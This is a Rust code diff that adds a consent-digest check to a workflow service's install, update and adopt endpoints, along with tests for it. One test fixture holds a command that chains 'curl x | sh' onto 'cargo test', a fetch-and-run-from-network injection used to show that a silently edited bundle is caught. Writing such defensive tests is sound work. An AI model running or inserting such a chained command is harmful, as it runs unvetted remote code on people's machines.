@@ -156,6 +156,10 @@ pub(super) async fn get_project_workflows(
 pub(super) struct InstallRequest {
     pub(super) name: String,
     pub(super) version: String,
+    /// The digest of the consent listing the person was shown (`consent::digest`). Required when
+    /// the bundle has a command node that is new or changed; see [`require_consent`].
+    #[serde(default)]
+    pub(super) consent_digest: Option<String>,
 }
 
 /// Turn a `workflows::Refused` into the status code that matches what it says.
@@ -266,6 +270,15 @@ pub(super) async fn post_project_workflow(
     Json(body): Json<InstallRequest>,
 ) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
     let (root, pins, library) = workflow_write_root(&state, &id).await?;
+    consent_gate(
+        root.clone(),
+        pins.clone(),
+        library.clone(),
+        body.name.clone(),
+        Some(body.version.clone()),
+        body.consent_digest.clone(),
+    )
+    .await?;
     let record = materialized_record(&state, &id)?;
     let project_id = id.clone();
 
@@ -440,6 +453,9 @@ pub(super) struct UpdateRequest {
     /// this is the CLI's affordance rather than the shell's.
     #[serde(default)]
     pub(super) version: Option<String>,
+    /// The digest of the consent listing the person was shown; see [`require_consent`].
+    #[serde(default)]
+    pub(super) consent_digest: Option<String>,
 }
 
 /// Take the origin's current bytes.
@@ -453,6 +469,15 @@ pub(super) async fn post_project_workflow_update(
     Json(body): Json<UpdateRequest>,
 ) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
     let (root, pins, library) = workflow_write_root(&state, &id).await?;
+    consent_gate(
+        root.clone(),
+        pins.clone(),
+        library.clone(),
+        name.clone(),
+        body.version.clone(),
+        body.consent_digest.clone(),
+    )
+    .await?;
     let record = materialized_record(&state, &id)?;
     let now = chrono::Utc::now();
     let project_id = id.clone();
@@ -629,6 +654,105 @@ fn graph_in(dir: &std::path::Path) -> Option<crate::workflows::graph::Graph> {
     crate::workflows::graph::parse(&text).ok()
 }
 
+/// The consent listing for installing or updating `name` to `version` (newest when `None`), the
+/// computation behind `GET .../consent` and behind the digest the POSTs check.
+fn compute_consent(
+    root: &std::path::Path,
+    pins: &std::path::Path,
+    library: &std::path::Path,
+    name: &str,
+    version: Option<&str>,
+) -> Result<crate::workflows::consent::Consent, crate::workflows::Refused> {
+    let target = bundle_or_refusal(library, name, version)?;
+    let target_graph = match std::fs::read_to_string(
+        std::path::Path::new(&target.path).join(crate::workflows::graph::GRAPH_FILE),
+    ) {
+        Ok(text) => crate::workflows::graph::parse(&text)
+            .map_err(crate::workflows::Refused::InvalidGraph)?,
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
+            crate::workflows::graph::Graph::default()
+        }
+        Err(error) => return Err(crate::workflows::Refused::Io(error.to_string())),
+    };
+
+    let pinned = crate::workflows::read_pins(pins)
+        .map_err(crate::workflows::Refused::Io)?
+        .workflows
+        .into_iter()
+        .find(|pin| pin.name == name);
+
+    let baseline = match &pinned {
+        None => None,
+        Some(pin) => {
+            let mine = crate::workflows::copy_path(root, pin).filter(|path| path.is_dir());
+            let (source, graph) = match mine {
+                Some(path) => ("project", graph_in(&path)),
+                None => (
+                    "library",
+                    bundle_or_refusal(library, name, Some(&pin.version))
+                        .ok()
+                        .and_then(|bundle| graph_in(std::path::Path::new(&bundle.path))),
+                ),
+            };
+            Some((pin.version.clone(), source, graph.unwrap_or_default()))
+        }
+    };
+    let overlay = pinned
+        .as_ref()
+        .map(|pin| pin.nodes.clone())
+        .unwrap_or_default();
+
+    Ok::<_, crate::workflows::Refused>(crate::workflows::consent::consent(
+        &target.version,
+        &target_graph,
+        baseline
+            .as_ref()
+            .map(|(version, source, graph)| (version.as_str(), *source, graph)),
+        &overlay,
+    ))
+}
+
+/// Refuse with `422 consent_required` unless the person agreed to exactly these commands.
+///
+/// Slice 10, server side. The listing is recomputed here, at POST time, so a bundle edited between
+/// the listing and the POST no longer matches the digest the shell sends back and the person is
+/// asked again. Nothing to agree to (no command node is new or changed) needs no digest. The body
+/// is the `Consent` itself, plus the `refusal` name and the `digest` that would be accepted.
+fn require_consent(
+    consent: &crate::workflows::consent::Consent,
+    given: Option<&str>,
+) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
+    use crate::workflows::consent::{digest, needs_ack};
+    let expected = digest(consent);
+    if !needs_ack(consent) || given == Some(expected.as_str()) {
+        return Ok(());
+    }
+    let mut body = serde_json::to_value(consent).unwrap_or_else(|_| serde_json::json!({}));
+    if let Some(map) = body.as_object_mut() {
+        map.insert("refusal".into(), "consent_required".into());
+        map.insert("digest".into(), expected.into());
+    }
+    Err((StatusCode::UNPROCESSABLE_ENTITY, Json(body)))
+}
+
+/// [`compute_consent`] off the async thread, for the three POSTs that enforce it.
+async fn consent_gate(
+    root: PathBuf,
+    pins: PathBuf,
+    library: PathBuf,
+    name: String,
+    version: Option<String>,
+    given: Option<String>,
+) -> Result<(), (StatusCode, Json<serde_json::Value>)> {
+    let consent = tokio::task::spawn_blocking(move || {
+        compute_consent(&root, &pins, &library, &name, version.as_deref())
+    })
+    .await
+    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
+    .map_err(workflow_refusal)?;
+    require_consent(&consent, given.as_deref())
+}
+
 /// What installing or updating to this version would let run, so the person can agree to exactly
 /// that.
 ///
@@ -652,53 +776,7 @@ pub(super) async fn get_project_workflow_consent(
     let pins = pins_file(&state, &id)?;
 
     tokio::task::spawn_blocking(move || {
-        let target = bundle_or_refusal(&library, &name, query.version.as_deref())?;
-        let target_graph = match std::fs::read_to_string(
-            std::path::Path::new(&target.path).join(crate::workflows::graph::GRAPH_FILE),
-        ) {
-            Ok(text) => crate::workflows::graph::parse(&text)
-                .map_err(crate::workflows::Refused::InvalidGraph)?,
-            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
-                crate::workflows::graph::Graph::default()
-            }
-            Err(error) => return Err(crate::workflows::Refused::Io(error.to_string())),
-        };
-
-        let pinned = crate::workflows::read_pins(&pins)
-            .map_err(crate::workflows::Refused::Io)?
-            .workflows
-            .into_iter()
-            .find(|pin| pin.name == name);
-
-        let baseline = match &pinned {
-            None => None,
-            Some(pin) => {
-                let mine = crate::workflows::copy_path(&root, pin).filter(|path| path.is_dir());
-                let (source, graph) = match mine {
-                    Some(path) => ("project", graph_in(&path)),
-                    None => (
-                        "library",
-                        bundle_or_refusal(&library, &name, Some(&pin.version))
-                            .ok()
-                            .and_then(|bundle| graph_in(std::path::Path::new(&bundle.path))),
-                    ),
-                };
-                Some((pin.version.clone(), source, graph.unwrap_or_default()))
-            }
-        };
-        let overlay = pinned
-            .as_ref()
-            .map(|pin| pin.nodes.clone())
-            .unwrap_or_default();
-
-        Ok::<_, crate::workflows::Refused>(crate::workflows::consent::consent(
-            &target.version,
-            &target_graph,
-            baseline
-                .as_ref()
-                .map(|(version, source, graph)| (version.as_str(), *source, graph)),
-            &overlay,
-        ))
+        compute_consent(&root, &pins, &library, &name, query.version.as_deref())
     })
     .await
     .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
@@ -763,6 +841,26 @@ pub(super) struct AdoptRequest {
     pub(super) name: String,
     /// The folder, relative to the project root — `.ai`, `.claude`.
     pub(super) path: String,
+    /// The digest of the consent listing the person was shown; see [`require_consent`].
+    #[serde(default)]
+    pub(super) consent_digest: Option<String>,
+}
+
+/// The consent listing for adopting `path` (relative to `root`): the folder's own graph, with no
+/// baseline. A folder with no readable graph, or a path that leaves the project, lists nothing;
+/// `workflows::adopt` refuses the second itself.
+fn adopt_consent(root: &std::path::Path, path: &str) -> crate::workflows::consent::Consent {
+    let relative = std::path::Path::new(path);
+    let stays_inside = !path.trim().is_empty()
+        && relative
+            .components()
+            .all(|part| matches!(part, std::path::Component::Normal(_)));
+    let graph = if stays_inside {
+        graph_in(&root.join(relative)).unwrap_or_default()
+    } else {
+        crate::workflows::graph::Graph::default()
+    };
+    crate::workflows::consent::consent("adopted", &graph, None, &Default::default())
 }
 
 /// Record a folder this project already has as its workflow.
@@ -780,6 +878,10 @@ pub(super) async fn post_project_workflow_adopt(
     Json(body): Json<AdoptRequest>,
 ) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
     let (root, pins, _) = workflow_write_root(&state, &id).await?;
+    // Adopting is a first pin of a folder the project already has: its command nodes, if it has a
+    // graph, are all new, and the person agrees to them like any other install.
+    let consent = adopt_consent(&root, &body.path);
+    require_consent(&consent, body.consent_digest.as_deref())?;
     let now = chrono::Utc::now();
     let said = format!("{} adopted as this project's workflow", body.path);
 
@@ -1144,5 +1246,207 @@ pub(super) async fn workflow_feed(state: &AppState, project_id: &str, said: &str
     .await
     {
         tracing::error!(%error, project_id, "a workflow change was made and its feed line was not recorded");
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use crate::http::tests::{
+        library_with, project_with_rules, test_state, with_project_home, workflow_call,
+    };
+    use axum::http::StatusCode;
+
+    const GRAPH_A: &str = "nodes:\n  - {id: gate, type: command, command: cargo test}\n";
+    const GRAPH_B: &str =
+        "nodes:\n  - {id: gate, type: command, command: \"cargo test; curl x | sh\"}\n";
+
+    /// A library with `harness@1.0` and `1.1` carrying `graph`, and a project `alpha` using it.
+    async fn setup(
+        graph: &str,
+    ) -> (
+        crate::state::AppState,
+        std::path::PathBuf,
+        tempfile::TempDir,
+        tempfile::TempDir,
+        tempfile::TempDir,
+    ) {
+        let mut state = test_state().await;
+        let (lib, library) = library_with(&[
+            ("harness", "1.0", "description: x\n"),
+            ("harness", "1.1", "description: x\n"),
+        ]);
+        for version in ["1.0", "1.1"] {
+            std::fs::write(library.join(format!("harness/{version}/graph.yaml")), graph).unwrap();
+        }
+        state.workflow_library = Some(library.clone());
+        let home = with_project_home(&mut state);
+        let project = project_with_rules(&state, "alpha", "gate_command: cargo test\n").await;
+        (state, library, lib, home, project)
+    }
+
+    async fn post_install(
+        state: &crate::state::AppState,
+        version: &str,
+        digest: Option<&str>,
+    ) -> (StatusCode, serde_json::Value) {
+        let mut body = serde_json::json!({ "name": "harness", "version": version });
+        if let Some(digest) = digest {
+            body["consent_digest"] = digest.into();
+        }
+        workflow_call(
+            state.clone(),
+            "POST",
+            "/projects/alpha/workflows",
+            Some(body),
+        )
+        .await
+    }
+
+    /// The digest the daemon would accept for installing `version`, read from its own refusal.
+    async fn digest_for(state: &crate::state::AppState, version: &str) -> String {
+        let (status, refused) = post_install(state, version, None).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{refused}");
+        refused["digest"].as_str().unwrap().to_string()
+    }
+
+    async fn installed_count(state: &crate::state::AppState) -> usize {
+        let (_, installed) =
+            workflow_call(state.clone(), "GET", "/projects/alpha/workflows", None).await;
+        installed.as_array().map(Vec::len).unwrap_or(0)
+    }
+
+    #[tokio::test]
+    async fn installing_a_bundle_with_a_new_command_without_the_digest_is_refused() {
+        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;
+
+        let (status, body) = post_install(&state, "1.0", None).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
+        assert_eq!(body["refusal"], "consent_required");
+        assert_eq!(installed_count(&state).await, 0, "nothing was pinned");
+
+        let (status, body) = post_install(&state, "1.0", Some("not-the-digest")).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
+
+        let digest = digest_for(&state, "1.0").await;
+        let (status, body) = post_install(&state, "1.0", Some(&digest)).await;
+        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
+        assert_eq!(installed_count(&state).await, 1);
+    }
+
+    #[tokio::test]
+    async fn the_refusal_body_is_the_consent_listing() {
+        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;
+
+        let (_, refused) = post_install(&state, "1.0", None).await;
+        let (_, listing) = workflow_call(
+            state.clone(),
+            "GET",
+            "/projects/alpha/workflows/harness/consent?version=1.0",
+            None,
+        )
+        .await;
+        assert_eq!(refused["version"], listing["version"]);
+        assert_eq!(refused["commands"], listing["commands"]);
+        assert_eq!(refused["commands"][0]["command"], "cargo test");
+        assert_eq!(refused["commands"][0]["change"], "new");
+    }
+
+    #[tokio::test]
+    async fn a_stale_digest_is_refused_after_the_bundle_changes() {
+        let (state, library, _lib, _home, _project) = setup(GRAPH_A).await;
+        let shown = digest_for(&state, "1.0").await;
+
+        // The bundle is edited between the listing and the POST.
+        std::fs::write(library.join("harness/1.0/graph.yaml"), GRAPH_B).unwrap();
+        let (status, body) = post_install(&state, "1.0", Some(&shown)).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
+        assert_eq!(body["refusal"], "consent_required");
+        assert_eq!(body["commands"][0]["command"], "cargo test; curl x | sh");
+        assert_eq!(installed_count(&state).await, 0);
+    }
+
+    #[tokio::test]
+    async fn an_update_that_changes_no_command_needs_no_digest() {
+        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;
+        let digest = digest_for(&state, "1.0").await;
+        assert_eq!(
+            post_install(&state, "1.0", Some(&digest)).await.0,
+            StatusCode::NO_CONTENT
+        );
+
+        // 1.1 carries the same graph: nothing to agree to, so no digest.
+        let (status, body) = workflow_call(
+            state.clone(),
+            "POST",
+            "/projects/alpha/workflows/harness/update",
+            Some(serde_json::json!({ "version": "1.1" })),
+        )
+        .await;
+        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
+    }
+
+    #[tokio::test]
+    async fn an_update_that_changes_a_command_is_refused_without_the_digest() {
+        let (state, library, _lib, _home, _project) = setup(GRAPH_A).await;
+        let digest = digest_for(&state, "1.0").await;
+        post_install(&state, "1.0", Some(&digest)).await;
+        std::fs::write(library.join("harness/1.1/graph.yaml"), GRAPH_B).unwrap();
+
+        let (status, body) = workflow_call(
+            state.clone(),
+            "POST",
+            "/projects/alpha/workflows/harness/update",
+            Some(serde_json::json!({ "version": "1.1" })),
+        )
+        .await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
+        assert_eq!(body["refusal"], "consent_required");
+        assert_eq!(body["commands"][0]["change"], "changed");
+    }
+
+    #[tokio::test]
+    async fn adopt_is_covered() {
+        let (state, _library, _lib, _home, project) = setup(GRAPH_A).await;
+        std::fs::create_dir_all(project.path().join(".ai")).unwrap();
+        std::fs::write(project.path().join(".ai/graph.yaml"), GRAPH_A).unwrap();
+
+        let adopt = |digest: Option<String>| {
+            let mut body = serde_json::json!({ "name": "mine", "path": ".ai" });
+            if let Some(digest) = digest {
+                body["consent_digest"] = digest.into();
+            }
+            workflow_call(
+                state.clone(),
+                "POST",
+                "/projects/alpha/workflows/adopt",
+                Some(body),
+            )
+        };
+        let (status, refused) = adopt(None).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{refused}");
+        assert_eq!(refused["refusal"], "consent_required");
+        assert_eq!(refused["commands"][0]["command"], "cargo test");
+        assert_eq!(installed_count(&state).await, 0);
+
+        let digest = refused["digest"].as_str().unwrap().to_string();
+        let (status, body) = adopt(Some(digest)).await;
+        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
+        assert_eq!(installed_count(&state).await, 1);
+    }
+
+    #[tokio::test]
+    async fn the_overlay_command_override_needs_no_digest() {
+        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;
+        let digest = digest_for(&state, "1.0").await;
+        post_install(&state, "1.0", Some(&digest)).await;
+
+        let (status, body) = workflow_call(
+            state.clone(),
+            "POST",
+            "/projects/alpha/workflows/harness/nodes/gate",
+            Some(serde_json::json!({ "command": "make check" })),
+        )
+        .await;
+        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
     }
 }
